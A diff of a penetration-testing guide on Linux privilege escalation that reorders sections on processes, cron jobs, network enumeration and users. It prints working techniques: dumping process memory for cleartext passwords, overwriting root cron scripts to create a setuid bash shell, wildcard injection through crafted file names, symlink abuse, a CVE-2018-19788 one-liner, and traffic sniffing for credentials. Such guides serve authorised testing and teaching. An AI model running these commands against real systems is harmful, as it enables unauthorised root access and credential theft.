@@ -194,39 +194,114 @@ If you have SSH access to the machine you could also use **openVAS** to check fo
 _Note that these commands will show a lot of information that will mostly be useless, therefore it's recommended some application like OpenVAS or similar that will check if any installed software version is vulnerable to known exploits_
 {% endhint %}
 
-## Users
+## Processes
 
-Check who you are, which privileges do you have, which users are in the systems, which ones can login and which ones have root privileges
+Take a look to **what processes** are being executed and check if any process has **more privileges that it should** \(maybe a tomcat being executed by root?\)
 
 ```bash
-id || (whoami && groups) 2>/dev/null #Me?
-cat /etc/passwd | cut -d: -f1 #All users
-cat /etc/passwd | grep "sh$" #Users with console
-awk -F: '($3 == "0") {print}' /etc/passwd #Superusers
-w #Currently login users
-last | tail #Login history
+ps aux
+ps -ef
+top -n 1
 ```
 
-### Big UID
+Also **check your privileges over the processes binaries**, maybe you can overwrite someone.
 
-Some Linux versions were affected by a bug that allow users with **UID &gt; INT\_MAX** to escalate privileges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74),  [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).  
-**Exploit it** using: **`systemd-run -t /bin/bash`**
+### Process monitoring
 
-### Known passwords
+You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.
 
-If you know any password of the environment try to login as each user using the password.
+### Process memory
 
-## Groups
+Some services of a server save **credentials in clear text inside the memory**. If you have access to the memory of a FTP service \(for example\) you could get the Heap and search inside of it the credentials.
 
-Check if you are in some group that could grant you root rights:
+```bash
+gdb -p <FTP_PROCESS_PID>
+(gdb) info proc mappings
+(gdb) q
+(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
+(gdb) q
+strings /tmp/mem_ftp #User and password
+```
 
-{% page-ref page="interesting-groups-linux-pe/" %}
+#### /proc/$pid/maps &  /proc/$pid/mem
 
-## Writable PATH abuses
+For a given process ID, **maps shows how memory is mapped within that processes'** virtual address space; it also shows the **permissions of each mapped region**. The **mem** psuedo file **exposes the processes memory itself**. From the **maps** file we know which **memory regions are readable** and their offsets. We use this information to **seek into the mem file and dump all readable regions** to a file.
 
-### $PATH
+To dump a process memory you could use:
 
-If you find that you can **write inside some folder of the $PATH** you may be able to escalate privileges by **creating a backdoor inside the writable folder** with the name of some command that is going to be executed by a different user \(root ideally\) and that is **not loaded from a folder that is located previous** to your writable folder in $PATH.
+* [https://github.com/hajzer/bash-memory-dump](https://github.com/hajzer/bash-memory-dump) \(root is required\)
+* Script A.5 from [https://www.delaat.net/rp/2016-2017/p97/report.pdf](https://www.delaat.net/rp/2016-2017/p97/report.pdf) \(root is required\)
+
+```text
+strings /dev/mem -n10 | grep -i PASS
+```
+
+## Scheduled/Cron jobs
+
+Check if any scheduled job is vulnerable. Maybe you can take advantage of a script being executed by root \(wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?\).
+
+```bash
+crontab -l
+ls -al /etc/cron* /etc/at*
+cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
+```
+
+### Cron path
+
+For example, inside _/etc/crontab_ you can find the PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_
+
+\(_Note how the user "user" has writing privileges over /home/user_\)
+
+If inside this crontab the root user tries to execute some command or script without setting the path. For example: _\* \* \* \* root overwrite.sh_  
+Then, you can get a root shell by using:
+
+```bash
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+#Wait cron job to be executed
+/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
+```
+
+### Cron using a script with a wildcard \(Wildcard Injection\)
+
+If a script being executed by root has a “**\***” inside a command, you could exploit this to make unexpected things \(like privesc\). Example:
+
+```bash
+rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
+```
+
+**If the wildcard is preceded of a path like** _**/some/path/\***_  **, it's not vulnerable \(even** _**./\***_ **is not\).**
+
+Read the following page for more wildcard exploitation tricks:
+
+{% page-ref page="wildcards-spare-tricks.md" %}
+
+### Cron script overwriting and symlink
+
+If you **can modify a cron script** executed by root, you can get a shell very easily:
+
+```bash
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
+#Wait until it is executed
+/tmp/bash -p
+```
+
+If the script executed by root uses a **directory where you have full access**, maybe it could be useful to delete that folder and **create a symlink folder to another one** serving a script controlled by you
+
+```bash
+ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
+```
+
+### Frequent cron jobs
+
+You can monitor the processes to search for processes that are being executed every 1,2 or 5 minutes. Maybe you can take advantage of it and escalate privileges.
+
+For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and deleting the commands that have beeing executed all the time, you can do:
+
+```bash
+for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
+```
+
+**You can also use** [**pspy**](https://github.com/DominicBreuker/pspy/releases) \(this will monitor and list every process that start\).
 
 ## Services
 
@@ -282,7 +357,7 @@ In the documentation you can read what the Unit is:
 
 Therefore, in order to abuse this permissions you would need to:
 
-* find some systemd unit \(like a `.service`\) that is **executing a writable binary**
+* Find some systemd unit \(like a `.service`\) that is **executing a writable binary**
 * Find some systemd unit that is **executing a relative path** and you have **writable privileges** over the **systemd PATH** \(to impersonate that executable\)
 
 **Learn more about timers with  `man systemd.timer`.**
@@ -359,107 +434,84 @@ Policies to the context "default" affects everyone not affected by other policie
 
 {% page-ref page="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
 
-## Processes
+## **Network**
 
-Take a look to what processes are being executed and check if any process has more privileges that it should \(maybe a tomcat being executed by root?\)
+It's always interesting to enumerate the network and figure out the position of the machine.
 
-```bash
-ps aux
-ps -ef
-top -n 1
-```
-
-### Process memory
-
-Some services of a server save **credentials in clear text inside the memory**. If you have access to the memory of a FTP service \(for example\) you could get the Heap and search inside of it the credentials.
+### Generic enumeration
 
 ```bash
-gdb -p <FTP_PROCESS_PID>
-(gdb) info proc mappings
-(gdb) q
-(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
-(gdb) q
-strings /tmp/mem_ftp #User and password
+#Hostname, hosts and DNS
+cat /etc/hostname /etc/hosts /etc/resolv.conf
+dnsdomainname
+
+#Content of /etc/inetd.conf & /etc/xinetd.conf
+cat /etc/inetd.conf /etc/xinetd.conf
+
+#Networks and neighbours
+cat /etc/networks
+(ifconfig || ip a)
+(route || ip n)
+
+#Iptables rules
+(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)
+
+#Active Ports
+
 ```
 
-#### /proc/$pid/maps &  /proc/$pid/mem
+### Open ports
 
-For a given process ID, **maps shows how memory is mapped within that processes'** virtual address space; it also shows the **permissions of each mapped region**. The **mem** psuedo file **exposes the processes memory itself**. From the **maps** file we know which **memory regions are readable** and their offsets. We use this information to **seek into the mem file and dump all readable regions** to a file.
+Always check network services running on the machine that you wasn't able to interact with before accessing to it:
 
-To dump a process memory you could use:
+```bash
+(netstat -punta || ss --ntpu)
+(netstat -punta || ss --ntpu) | grep "127.0"
+```
 
-* [https://github.com/hajzer/bash-memory-dump](https://github.com/hajzer/bash-memory-dump) \(root is required\)
-* Script A.5 from [https://www.delaat.net/rp/2016-2017/p97/report.pdf](https://www.delaat.net/rp/2016-2017/p97/report.pdf) \(root is required\)
+### Sniffing
 
-
+Check if you can sniff traffic. If you can, you could be able to grab some credentials.
 
 ```text
-strings /dev/mem -n10 | grep -i PASS
+timeout 1 tcpdump
 ```
 
-## Scheduled jobs
+## Users
 
-Check if any scheduled job has any type of vulnerability. Maybe you can take advantage of any script that root executes sometimes \(wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?\).
+Check who you are, which privileges do you have, which users are in the systems, which ones can login and which ones have root privileges
 
 ```bash
-crontab -l
-ls -al /etc/cron* /etc/at*
-cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
+id || (whoami && groups) 2>/dev/null #Me?
+cat /etc/passwd | cut -d: -f1 #All users
+cat /etc/passwd | grep "sh$" #Users with console
+awk -F: '($3 == "0") {print}' /etc/passwd #Superusers
+w #Currently login users
+last | tail #Login history
 ```
 
-### Example: Cron path
+### Big UID
 
-For example, inside _/etc/crontab_ you can find the sentence: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_
+Some Linux versions were affected by a bug that allow users with **UID &gt; INT\_MAX** to escalate privileges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74),  [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).  
+**Exploit it** using: **`systemd-run -t /bin/bash`**
 
-If inside this crontab the root user tries to execute some command or script without setting the path. For example: _\* \* \* \* root overwrite.sh_
+### Known passwords
 
-Then, you can get a root shell by using:
+If you know any password of the environment try to login as each user using the password.
 
-```bash
-echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
-#Wait 1 min
-/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
-```
+## Groups
 
-### Example: Cron using a script with a wildcard \(Wildcard Injection\)
+Check if you are in some group that could grant you root rights:
 
-If a script being executed by root has an “**\***” inside a command, you could exploit this to make unexpected things \(like privesc\). Example:
+{% page-ref page="interesting-groups-linux-pe/" %}
 
-```bash
-rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
-```
+## Writable PATH abuses
 
-**The wildcard cannot be preceded of a path:** _**/some/path/\***_ **is not vulnerable \(even** _**./\***_ **is not\)**
+### $PATH
 
-\*\*\*\*[**Read this for more Wildcards spare tricks**](wildcards-spare-tricks.md)
+If you find that you can **write inside some folder of the $PATH** you may be able to escalate privileges by **creating a backdoor inside the writable folder** with the name of some command that is going to be executed by a different user \(root ideally\) and that is **not loaded from a folder that is located previous** to your writable folder in $PATH.
 
-### Example: Cron script overwriting and symlink
-
-If you can write inside a cron script executed by root, you can get a shell very easily:
-
-```bash
-echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
-#Wait until it is executed
-/tmp/bash -p
-```
-
-If the script executed by root uses somehow a directory in which you have full access, maybe it could be useful to delete that folder and create a symlink folder to another one
-
-```bash
-ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
-```
-
-### Frequent cron jobs
-
-You can monitor the processes to search for processes that are being executed every 1,2 or 5 minutes. Maybe you can take advantage of it and escalate privileges.
-
-For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and deleting the commands that have beeing executed all the time, you can do:
-
-```bash
-for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
-```
-
-You could also use [pspy](https://github.com/DominicBreuker/pspy/releases) \(this will monitor every started process\).
+## \*\*\*\*
 
 ## SUDO and SUID
 
@@ -1127,14 +1179,6 @@ You should check if any undiscovered service is running in some port/interface. 
 ```bash
 netstat -punta
 ss -t; ss -u
-```
-
-## Sniffing
-
-Check if you can sniff traffic. If you can, you could be able to grab some credentials.
-
-```text
-timeout 1 tcpdump
 ```
 
 ## Storage information
